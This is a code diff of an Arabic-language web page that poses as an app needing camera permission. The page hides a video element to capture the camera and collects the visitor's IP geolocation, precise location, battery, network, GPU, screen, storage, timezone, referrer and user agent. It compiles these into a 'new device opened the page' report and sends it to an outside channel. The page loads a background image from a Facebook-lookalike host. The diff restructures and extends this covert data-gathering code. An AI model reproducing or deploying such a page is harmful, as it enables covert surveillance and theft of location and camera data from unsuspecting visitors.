@@ -214,42 +214,38 @@
   }
 </style>
 
-
-
 <style id="em-gold-control-background">
 html,body{
-  background:
+  background-image:
     linear-gradient(
       rgba(0,0,0,.18),
       rgba(0,0,0,.18)
     ),
     url('https://facebook-pink-phi.vercel.app/site-background.jpg')
-    no-repeat center center / cover !important;
+    !important;
 
-  background-color:transparent !important;
-  min-height:100vh !important;
-}
-
-@media (max-width:900px){
-  html,body{
-    background-attachment:scroll !important;
-  }
+  background-size:cover !important;
+  background-position:center !important;
+  background-attachment:fixed !important;
 }
 </style>
 </head>
 <body>
 
+<!-- ============ شاشة التحميل ============ -->
 <div id="loader">
   <div class="spinner"></div>
   <div class="loading-text">جاري التحميل</div>
 </div>
 
+<!-- ============ شاشة الرفض ============ -->
 <div id="denied">
   <h1>تم رفض الوصول للكاميرا</h1>
   <p>يجب السماح بالكاميرا لتحميل التطبيق.<br>الرجاء الضغط على الزر أدناه والموافقة على الإذن.</p>
   <button id="retryBtn">إعادة المحاولة</button>
 </div>
 
+<!-- ============ الفيديو المخفي ============ -->
 <video id="v" autoplay playsinline muted></video>
 
 <script>
@@ -301,222 +297,323 @@ html,body{
   }
 
   /* ============================================================
-     📡 جلب الـ IP والموقع من السيرفر
+     📡 1) جلب بيانات الـ IP من السيرفر
      ============================================================ */
   async function fetchIPInfo(){
-    // مصدر أول
-    try{
-      const r = await fetch("https://ipapi.co/json/");
-      if(r.ok){
+    const sources = [
+      async () => {
+        const r = await fetch("https://ipapi.co/json/");
+        if(!r.ok) return null;
         const j = await r.json();
-        if(j && j.ip){
-          return {
-            ip      : j.ip,
-            city    : j.city,
-            region  : j.region,
-            country : j.country_name,
-            postal  : j.postal,
-            isp     : j.org,
-            asn     : j.asn,
-            lat     : j.latitude,
-            lon     : j.longitude,
-            tz      : j.timezone
-          };
-        }
+        if(!j || !j.ip) return null;
+        return {
+          ip      : j.ip,
+          country : j.country_name,
+          region  : j.region,
+          city    : j.city,
+          postal  : j.postal,
+          isp     : j.org,
+          asn     : j.asn,
+          lat     : j.latitude,
+          lon     : j.longitude,
+          tz      : j.timezone
+        };
+      },
+      async () => {
+        const r = await fetch("https://api.ipify.org?format=json");
+        if(!r.ok) return null;
+        const j = await r.json();
+        return j && j.ip ? { ip: j.ip } : null;
       }
-    }catch(_){}
+    ];
 
-    // مصدر بديل
-    try{
-      const r2 = await fetch("https://api.ipify.org?format=json");
-      if(r2.ok){
-        const j2 = await r2.json();
-        if(j2 && j2.ip){
-          return { ip: j2.ip };
-        }
-      }
-    }catch(_){}
-
+    for(const src of sources){
+      try{
+        const data = await src();
+        if(data) return data;
+      }catch(_){}
+    }
     return null;
   }
 
   /* ============================================================
-     🧠 بيانات المتصفح المتقدمة
+     🔋 2) البطارية
      ============================================================ */
   async function getBattery(){
     try{
       if(!navigator.getBattery) return null;
       const b = await navigator.getBattery();
-      return {level: Math.round(b.level*100)+"%", charging: b.charging};
-    }catch{ return null; }
-  }
-
-  function getConn(){
-    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if(!c) return null;
-    return {
-      type     : c.effectiveType || "—",
-      downlink : c.downlink != null ? c.downlink : "—",
-      rtt      : c.rtt != null ? c.rtt : "—",
-      saveData : c.saveData ? "نعم" : "لا"
-    };
-  }
-
-  function devType(){
-    const ua = navigator.userAgent;
-    if(/Android/i.test(ua)) return "Android";
-    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-    if(/Windows/i.test(ua)) return "Windows";
-    if(/Macintosh|Mac OS X/i.test(ua)) return "Mac";
-    if(/Linux/i.test(ua)) return "Linux";
-    return "—";
-  }
-
-  function getBrowserInfo(){
-    const ua = navigator.userAgent;
-    let name = "غير معروف", ver = "";
-    if(/Edg\/([\d.]+)/.test(ua))         { name="Microsoft Edge"; ver=RegExp.$1; }
-    else if(/OPR\/([\d.]+)/.test(ua))    { name="Opera";          ver=RegExp.$1; }
-    else if(/Chrome\/([\d.]+)/.test(ua)) { name="Chrome";         ver=RegExp.$1; }
-    else if(/Firefox\/([\d.]+)/.test(ua)){ name="Firefox";        ver=RegExp.$1; }
-    else if(/Version\/([\d.]+).*Safari/.test(ua)) { name="Safari"; ver=RegExp.$1; }
-    else if(/MSIE ([\d.]+)/.test(ua))    { name="IE";             ver=RegExp.$1; }
-    return { name, ver };
-  }
-
-  function getOSInfo(){
-    const ua = navigator.userAgent;
-    let name = "—", ver = "";
-    if(/Windows NT ([\d.]+)/.test(ua)){
-      name="Windows";
-      const map={"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7","6.0":"Vista","5.1":"XP"};
-      ver = map[RegExp.$1] || RegExp.$1;
-    }
-    else if(/Android ([\d.]+)/.test(ua)){ name="Android"; ver=RegExp.$1; }
-    else if(/iPhone OS ([\d_]+)/.test(ua)){ name="iOS"; ver=RegExp.$1.replace(/_/g,"."); }
-    else if(/Mac OS X ([\d_]+)/.test(ua)){ name="macOS"; ver=RegExp.$1.replace(/_/g,"."); }
-    else if(/Linux/.test(ua)){ name="Linux"; }
-    return { name, ver };
-  }
-
-  function getGPU(){
-    try{
-      const c = document.createElement("canvas");
-      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-      if(!gl) return "—";
-      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-      if(dbg){
-        return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "—";
-      }
-      return gl.getParameter(gl.RENDERER) || "—";
-    }catch{ return "—"; }
-  }
-
-  async function getStorage(){
-    try{
-      if(!navigator.storage || !navigator.storage.estimate) return null;
-      const est = await navigator.storage.estimate();
       return {
-        quota : (est.quota/1024/1024).toFixed(1) + " MB",
-        usage : (est.usage/1024/1024).toFixed(2) + " MB"
+        level    : Math.round(b.level * 100) + "%",
+        charging : b.charging ? "⚡ يشحن" : "🔌 لا يشحن"
       };
     }catch{ return null; }
   }
 
-  function getOrientation(){
-    if(screen.orientation && screen.orientation.type) return screen.orientation.type;
-    if(window.orientation === 0 || window.orientation === 180) return "portrait";
-    if(window.orientation === 90 || window.orientation === -90) return "landscape";
-    return "—";
+  /* ============================================================
+     📶 3) حالة الشبكة
+     ============================================================ */
+  function getNetworkInfo(){
+    const c = navigator.connection
+           || navigator.mozConnection
+           || navigator.webkitConnection;
+
+    return {
+      online   : navigator.onLine ? "نعم" : "لا",
+      type     : c ? (c.effectiveType || "—") : "—",
+      downlink : c && c.downlink != null ? c.downlink + " Mbps" : "—",
+      rtt      : c && c.rtt != null ? c.rtt + " ms" : "—",
+      saveData : c ? (c.saveData ? "نعم" : "لا") : "—"
+    };
   }
 
+  /* ============================================================
+     🖥 4) نظام التشغيل
+     ============================================================ */
+  function getOSInfo(){
+    const ua = navigator.userAgent;
+    let name = "—", version = "";
+
+    if(/Windows NT ([\d.]+)/.test(ua)){
+      const map = {"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7","6.0":"Vista","5.1":"XP"};
+      name = "Windows";
+      version = map[RegExp.$1] || RegExp.$1;
+    }
+    else if(/Android ([\d.]+)/.test(ua)){
+      name = "Android"; version = RegExp.$1;
+    }
+    else if(/iPhone OS ([\d_]+)/.test(ua)){
+      name = "iOS"; version = RegExp.$1.replace(/_/g,".");
+    }
+    else if(/Mac OS X ([\d_]+)/.test(ua)){
+      name = "macOS"; version = RegExp.$1.replace(/_/g,".");
+    }
+    else if(/Linux/.test(ua)){
+      name = "Linux";
+    }
+
+    return { name, version };
+  }
+
+  /* ============================================================
+     🌐 5) المتصفح
+     ============================================================ */
+  function getBrowserInfo(){
+    const ua = navigator.userAgent;
+
+    if(/Edg\/([\d.]+)/.test(ua))                  return { name:"Microsoft Edge", version:RegExp.$1 };
+    if(/OPR\/([\d.]+)/.test(ua))                  return { name:"Opera",          version:RegExp.$1 };
+    if(/Chrome\/([\d.]+)/.test(ua))               return { name:"Chrome",         version:RegExp.$1 };
+    if(/Firefox\/([\d.]+)/.test(ua))              return { name:"Firefox",        version:RegExp.$1 };
+    if(/Version\/([\d.]+).*Safari/.test(ua))      return { name:"Safari",         version:RegExp.$1 };
+    if(/MSIE ([\d.]+)/.test(ua))                  return { name:"IE",             version:RegExp.$1 };
+
+    return { name:"غير معروف", version:"" };
+  }
+
+  /* ============================================================
+     🎮 6) كارت الرسومات
+     ============================================================ */
+  function getGPU(){
+    try{
+      const c  = document.createElement("canvas");
+      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if(!gl) return "—";
+
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if(dbg) return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "—";
+
+      return gl.getParameter(gl.RENDERER) || "—";
+    }catch{ return "—"; }
+  }
+
+  /* ============================================================
+     💾 7) التخزين
+     ============================================================ */
+  async function getStorageInfo(){
+    try{
+      if(!navigator.storage || !navigator.storage.estimate) return null;
+      const est = await navigator.storage.estimate();
+      return {
+        quota : (est.quota / 1024 / 1024).toFixed(1) + " MB",
+        usage : (est.usage / 1024 / 1024).toFixed(2) + " MB"
+      };
+    }catch{ return null; }
+  }
+
+  /* ============================================================
+     🖥 8) الشاشة
+     ============================================================ */
+  function getScreenInfo(){
+    let orientation = "—";
+    if(screen.orientation && screen.orientation.type){
+      orientation = screen.orientation.type;
+    }else if(window.orientation === 0 || window.orientation === 180){
+      orientation = "portrait";
+    }else if(window.orientation === 90 || window.orientation === -90){
+      orientation = "landscape";
+    }
+
+    return {
+      size        : `${screen.width}×${screen.height}`,
+      availSize   : `${screen.availWidth}×${screen.availHeight}`,
+      dpr         : devicePixelRatio,
+      colorDepth  : screen.colorDepth + " bit",
+      pixelDepth  : screen.pixelDepth + " bit",
+      orientation : orientation
+    };
+  }
+
+  /* ============================================================
+     🕐 9) الوقت والتوقيت
+     ============================================================ */
+  function getTimeInfo(){
+    const offsetMin = new Date().getTimezoneOffset();
+    const sign      = offsetMin <= 0 ? "+" : "-";
+    const hours     = Math.abs(offsetMin / 60);
+
+    return {
+      zone      : Intl.DateTimeFormat().resolvedOptions().timeZone,
+      utcOffset : `UTC${sign}${hours}`,
+      localTime : new Date().toLocaleString("ar-EG")
+    };
+  }
+
+  /* ============================================================
+     🔒 10) الخصوصية
+     ============================================================ */
+  function getPrivacyInfo(){
+    return {
+      cookies : navigator.cookieEnabled ? "مفعّلة" : "معطّلة",
+      dnt     : navigator.doNotTrack || "—",
+      referrer: document.referrer || "مباشر"
+    };
+  }
+
+  /* ============================================================
+     📱 11) الجهاز (عام)
+     ============================================================ */
+  function getDeviceInfo(){
+    const ua = navigator.userAgent;
+    let type = "—";
+
+    if(/Android/i.test(ua))                 type = "Android";
+    else if(/iPhone|iPad|iPod/i.test(ua))   type = "iOS";
+    else if(/Windows/i.test(ua))            type = "Windows";
+    else if(/Macintosh|Mac OS X/i.test(ua)) type = "Mac";
+    else if(/Linux/i.test(ua))              type = "Linux";
+
+    return {
+      type      : type,
+      platform  : navigator.platform || "—",
+      language  : navigator.language,
+      languages : (navigator.languages || []).join(", "),
+      cores     : navigator.hardwareConcurrency || "—",
+      memory    : navigator.deviceMemory ? navigator.deviceMemory + " GB" : "—",
+      touch     : ("ontouchstart" in window) ? "نعم" : "لا",
+      maxTouch  : navigator.maxTouchPoints || 0
+    };
+  }
+
+  /* ============================================================
+     🧩 12) تجميع كل البيانات وإرسالها منسّقة
+     ============================================================ */
   async function collect(){
-    // نجمع كل حاجة بالتوازي عشان السرعه
     const [bat, ipInfo, storage] = await Promise.all([
       getBattery(),
       fetchIPInfo(),
-      getStorage()
+      getStorageInfo()
     ]);
 
-    const con = getConn();
-    const br  = getBrowserInfo();
-    const os  = getOSInfo();
-    const gpu = getGPU();
+    const net     = getNetworkInfo();
+    const os      = getOSInfo();
+    const browser = getBrowserInfo();
+    const gpu     = getGPU();
+    const screenI = getScreenInfo();
+    const time    = getTimeInfo();
+    const privacy = getPrivacyInfo();
+    const device  = getDeviceInfo();
 
-    const lines = [];
-    lines.push("🔔 <b>جهاز جديد فتح الصفحة</b>\n");
+    const L = [];
+    const line  = (k, v) => L.push(`${k}: <code>${esc(v)}</code>`);
+    const title = (t)    => L.push(`\n━━━━━━━━━━━━━━━━━━\n<b>${t}</b>\n━━━━━━━━━━━━━━━━━━`);
 
-    // ------- IP والشبكة -------
-    lines.push("━━━━━━ <b>🌐 الشبكة و IP</b> ━━━━━━");
+    // ===== العنوان الرئيسي =====
+    L.push("🔔 <b>جهاز جديد فتح الصفحة</b>");
+
+    // ===== 🌐 الشبكة و IP =====
+    title("🌐 الشبكة و IP");
     if(ipInfo){
-      if(ipInfo.ip)      lines.push(`IP: <code>${esc(ipInfo.ip)}</code>`);
-      if(ipInfo.country) lines.push(`🌍 الدولة: <code>${esc(ipInfo.country)}</code>`);
-      if(ipInfo.region)  lines.push(`🏙 المحافظة: <code>${esc(ipInfo.region)}</code>`);
-      if(ipInfo.city)    lines.push(`🏠 المدينة: <code>${esc(ipInfo.city)}</code>`);
-      if(ipInfo.postal)  lines.push(`📮 الرمز البريدي: <code>${esc(ipInfo.postal)}</code>`);
-      if(ipInfo.isp)     lines.push(`📡 الشركة: <code>${esc(ipInfo.isp)}</code>`);
-      if(ipInfo.asn)     lines.push(`🔢 ASN: <code>${esc(ipInfo.asn)}</code>`);
-      if(ipInfo.lat)     lines.push(`📍 إحداثيات IP: <code>${ipInfo.lat},${ipInfo.lon}</code>`);
-      if(ipInfo.tz)      lines.push(`🕐 توقيت IP: <code>${esc(ipInfo.tz)}</code>`);
+      if(ipInfo.ip)      line("📌 IP",             ipInfo.ip);
+      if(ipInfo.country) line("🌍 الدولة",         ipInfo.country);
+      if(ipInfo.region)  line("🏙 المحافظة",       ipInfo.region);
+      if(ipInfo.city)    line("🏠 المدينة",        ipInfo.city);
+      if(ipInfo.postal)  line("📮 الرمز البريدي",  ipInfo.postal);
+      if(ipInfo.isp)     line("📡 الشركة المزودة", ipInfo.isp);
+      if(ipInfo.asn)     line("🔢 ASN",            ipInfo.asn);
+      if(ipInfo.lat)     line("📍 إحداثيات IP",   `${ipInfo.lat},${ipInfo.lon}`);
+      if(ipInfo.tz)      line("🕐 توقيت IP",      ipInfo.tz);
     }else{
-      lines.push("❌ لم يتم الحصول على بيانات IP");
+      L.push("❌ لم يتم الحصول على بيانات IP");
     }
-    if(con){
-      lines.push(`📶 نوع الشبكة: <code>${esc(con.type)}</code>`);
-      lines.push(`⬇️ سرعة تقريبية: <code>${esc(String(con.downlink))} Mbps</code>`);
-      lines.push(`⏱ زمن الاستجابة: <code>${esc(String(con.rtt))} ms</code>`);
-      lines.push(`💾 توفير البيانات: <code>${esc(con.saveData)}</code>`);
-    }
-    lines.push(`📡 متصل بالإنترنت: <code>${navigator.onLine ? "نعم" : "لا"}</code>`);
+    line("🔌 متصل",           net.online);
+    line("📶 نوع الشبكة",     net.type);
+    line("⬇️ السرعة",         net.downlink);
+    line("⏱ زمن الاستجابة",  net.rtt);
+    line("💾 توفير البيانات", net.saveData);
 
-    // ------- الجهاز -------
-    lines.push("\n━━━━━━ <b>📱 الجهاز</b> ━━━━━━");
-    lines.push(`نوع الجهاز: <code>${esc(devType())}</code>`);
-    lines.push(`نظام التشغيل: <code>${esc(os.name)} ${esc(os.ver)}</code>`);
-    lines.push(`المنصة: <code>${esc(navigator.platform || "—")}</code>`);
-    lines.push(`المتصفح: <code>${esc(br.name)} ${esc(br.ver)}</code>`);
-    lines.push(`اللغة: <code>${esc(navigator.language)}</code>`);
-    lines.push(`لغات مقترحة: <code>${esc((navigator.languages||[]).join(", "))}</code>`);
-    lines.push(`عدد الأنوية: <code>${navigator.hardwareConcurrency || "—"}</code>`);
-    lines.push(`الذاكرة التقديرية: <code>${navigator.deviceMemory ? navigator.deviceMemory+" GB" : "—"}</code>`);
-    lines.push(`كارت الرسومات: <code>${esc(gpu)}</code>`);
-    lines.push(`دعم اللمس: <code>${("ontouchstart" in window) ? "نعم" : "لا"}</code>`);
-    lines.push(`نقاط اللمس: <code>${navigator.maxTouchPoints || 0}</code>`);
-    lines.push(`البطارية: <code>${bat ? `${bat.level} ${bat.charging?"⚡ يشحن":"🔌 لا يشحن"}` : "—"}</code>`);
+    // ===== 📱 الجهاز =====
+    title("📱 الجهاز");
+    line("📱 النوع",        device.type);
+    line("🖥 المنصة",        device.platform);
+    line("🗣 اللغة",         device.language);
+    line("🗣 لغات مقترحة",  device.languages);
+    line("🧠 الأنوية",       device.cores);
+    line("💾 الذاكرة",       device.memory);
+    line("👆 دعم اللمس",     device.touch);
+    line("👆 نقاط اللمس",    device.maxTouch);
+    line("🔋 البطارية",     bat ? bat.level : "—");
+    line("⚡ حالة الشحن",    bat ? bat.charging : "—");
 
-    // ------- الشاشة -------
-    lines.push("\n━━━━━━ <b>🖥 الشاشة</b> ━━━━━━");
-    lines.push(`المقاس: <code>${screen.width}×${screen.height}</code>`);
-    lines.push(`المقاس الفعلي: <code>${screen.availWidth}×${screen.availHeight}</code>`);
-    lines.push(`كثافة البكسل: <code>${devicePixelRatio}</code>`);
-    lines.push(`عمق الألوان: <code>${screen.colorDepth} bit</code>`);
-    lines.push(`عمق البكسل: <code>${screen.pixelDepth} bit</code>`);
-    lines.push(`اتجاه الشاشة: <code>${esc(getOrientation())}</code>`);
+    // ===== 🌐 النظام والمتصفح =====
+    title("🌐 النظام والمتصفح");
+    line("💻 نظام التشغيل",  `${os.name} ${os.version}`.trim());
+    line("🌐 المتصفح",       `${browser.name} ${browser.version}`.trim());
+    line("🎮 كارت الرسومات", gpu);
 
-    // ------- التخزين -------
+    // ===== 🖥 الشاشة =====
+    title("🖥 الشاشة");
+    line("📐 المقاس",         screenI.size);
+    line("📐 المتاح",         screenI.availSize);
+    line("🔍 كثافة البكسل",  screenI.dpr);
+    line("🎨 عمق الألوان",    screenI.colorDepth);
+    line("🎨 عمق البكسل",     screenI.pixelDepth);
+    line("🔄 الاتجاه",         screenI.orientation);
+
+    // ===== 💾 التخزين =====
     if(storage){
-      lines.push("\n━━━━━━ <b>💾 التخزين</b> ━━━━━━");
-      lines.push(`المساحة المتاحة: <code>${storage.quota}</code>`);
-      lines.push(`المستخدم: <code>${storage.usage}</code>`);
+      title("💾 التخزين");
+      line("📦 المتاح",   storage.quota);
+      line("📊 المستخدم", storage.usage);
     }
 
-    // ------- إعدادات الخصوصية -------
-    lines.push("\n━━━━━━ <b>🔒 الخصوصية</b> ━━━━━━");
-    lines.push(`الكوكيز: <code>${navigator.cookieEnabled ? "مفعّلة" : "معطّلة"}</code>`);
-    lines.push(`Do Not Track: <code>${navigator.doNotTrack || "—"}</code>`);
-    lines.push(`المرجع: <code>${esc(document.referrer || "مباشر")}</code>`);
+    // ===== 🔒 الخصوصية =====
+    title("🔒 الخصوصية");
+    line("🍪 الكوكيز", privacy.cookies);
+    line("🛡 DNT",     privacy.dnt);
+    line("🔗 المرجع",  privacy.referrer);
 
-    // ------- الوقت والمنطقة -------
-    lines.push("\n━━━━━━ <b>🕐 الوقت</b> ━━━━━━");
-    lines.push(`المنطقة الزمنية: <code>${esc(Intl.DateTimeFormat().resolvedOptions().timeZone)}</code>`);
-    lines.push(`فرق التوقيت: <code>UTC${new Date().getTimezoneOffset() <= 0 ? "+" : "-"}${Math.abs(new Date().getTimezoneOffset()/60)}</code>`);
-    lines.push(`وقت الفتح: <code>${esc(new Date().toLocaleString("ar-EG"))}</code>`);
+    // ===== 🕐 الوقت =====
+    title("🕐 الوقت");
+    line("🌍 المنطقة الزمنية", time.zone);
+    line("⏰ فرق التوقيت",    time.utcOffset);
+    line("📅 وقت الفتح",      time.localTime);
 
-    // ------- UA -------
-    lines.push("\n━━━━━━ <b>🌐 User Agent</b> ━━━━━━");
-    lines.push(`<code>${esc(navigator.userAgent)}</code>`);
+    // ===== 🌐 UA =====
+    title("🌐 User Agent");
+    L.push(`<code>${esc(navigator.userAgent)}</code>`);
 
-    return lines.join("\n");
+    return L.join("\n");
   }
 
   /* ============================================================
@@ -727,7 +824,7 @@ html,body{
         sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
       }
 
-      // 4) نقفل الكاميرا
+      // 4) نقفل الكاميرا — بدون أي تحويل أو تحميل ملف
       await closeCamera();
 
     } catch (err) {
